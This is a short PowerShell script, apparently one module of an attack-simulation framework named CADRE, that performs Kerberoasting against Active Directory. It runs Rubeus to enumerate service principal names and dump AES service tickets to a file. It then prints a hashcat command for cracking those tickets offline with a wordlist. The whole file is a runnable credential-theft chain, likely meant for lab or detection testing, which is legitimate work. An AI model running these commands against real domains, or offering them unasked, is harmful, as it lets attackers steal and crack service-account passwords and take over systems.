# CADRE — WT#002 Kerberoasting (AES)
. ..\lib\cadre-env.ps1
. ..\lib\common.ps1
print_banner "WT#002 - Kerberoasting (AES)"
start_attack "002" "Kerberoasting (AES)"
require_tool Rubeus.exe

step "Enumerate kerberoastable SPNs"
run_cmd "Rubeus.exe kerberoast /stats /nowrap"

step "Request AES TGS hashes (RC4 is dead on Server 2025 KDC)"
run_cmd "Rubeus.exe kerberoast /aes /outfile:aes_tgs.txt /nowrap"

step "Crack offline (hashcat mode 19700 = TGS-REP AES256)"
run_cmd "Write-Host '  hashcat -m 19700 aes_tgs.txt rockyou.txt'"

result $LASTEXITCODE "Kerberoasting (AES) completed"
